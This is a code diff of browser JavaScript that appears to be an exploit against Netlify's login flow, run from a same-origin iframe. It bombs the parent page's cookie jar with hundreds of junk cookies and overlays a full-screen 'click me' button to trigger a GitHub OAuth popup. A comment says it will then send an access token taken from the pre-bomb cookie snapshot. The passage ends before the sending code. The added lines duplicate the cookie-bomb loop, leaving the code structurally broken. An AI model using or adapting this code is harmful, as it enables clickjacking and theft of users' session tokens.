@@ -1,27 +1,30 @@
-  var real = document.cookie;
+ var real = parent.document.cookie;
 
-  // 2. cookie bomb (same-origin iframe -> stuffs the REAL target jar)
+  // 2. cookie bomb on the PARENT jar
   for (var i = 0, prev = -1; i < 400; i++) {
-    document.cookie = 'junk' + i + '=' + 'A'.repeat(32) + '; Path=/';
-    var v = document.cookie.split(/; */).length;
+    parent.document.cookie = 'junk' + i + '=' + 'A'.repeat(32) + '; Path=/';
+    var v = parent.document.cookie.split(/; */).length;
+    if (v === prev) break;
+  // 2. cookie bomb on the PARENT jar
+  for (var i = 0, prev = -1; i < 400; i++) {
+    parent.document.cookie = 'junk' + i + '=' + 'A'.repeat(32) + '; Path=/';
+    var v = parent.document.cookie.split(/; */).length;
     if (v === prev) break;
     prev = v;
   }
 
-  // 3. full-viewport button on the target page (no document.write -> iframe survives)
+  // 3. full-viewport button on the PARENT page (no document.write -> iframe survives)
   var b = parent.document.createElement('button');
   b.id = 'p';
   b.textContent = 'click me';
-  b.style.cssText = 'position:fixed;inset:0;width:100vw;height:100vh;border:0;background:#fff;colo
-  r:#000;font-size:48px;cursor:pointer;z-index:2147483647';
+  b.style.cssText = 'position:fixed;inset:0;width:100vw;height:100vh;border:0;background:#fff;color:#000;font-size:48px;cursor:pointer;z-index:2147483647';
   parent.document.body.append(b);
 
-  // 4. click = user gesture -> popup allowed
+  // 4. click = user gesture on the parent -> popup opens in the parent window
   b.onclick = function () {
-    window.open('https://api.netlify.com/auth?provider=github&site_id=app.netlify.com&tracking_ses
-  sion_id=afc7d48b-e925-432a-a170-9121236eda09&login=true&entry_point=direct&browser_fingerprint=c
-  bdb5739abc754bdcc16cbd4fb07cd0f&device_fingerprint=bbbac72e6221cf088819fff54ca43b40&redirect=htt
-  ps%3A%2F%2fwww.netlify.com%2F&use_redirect=true', '_blank');
+    parent.open('https://api.netlify.com/auth?provider=github&site_id=app.netlify.com&tracking_session_id=afc7d48b-e925-432a-a170-9121236eda09&login=true&entry_point=direct&browser_fingerprint=cbdb5739abc754bdcc16cbd4fb07cd0f&device_fingerprint=bbbac72e6221cf088819fff54ca43b40&redirect=https%3A%2F%2fwww.netlify.com%2F&use_redirect=true', '_blank');
+
+    // 5. after the login, ship the OptanonConsent token from the pre-bomb snapshot
     setTimeout(function () {
       var t = (real.match(/OptanonConsent=([^;]*)/) || [])[1] || '';
       t = (t.match(/access_token%3D([^%&]+)/) || [])[1];
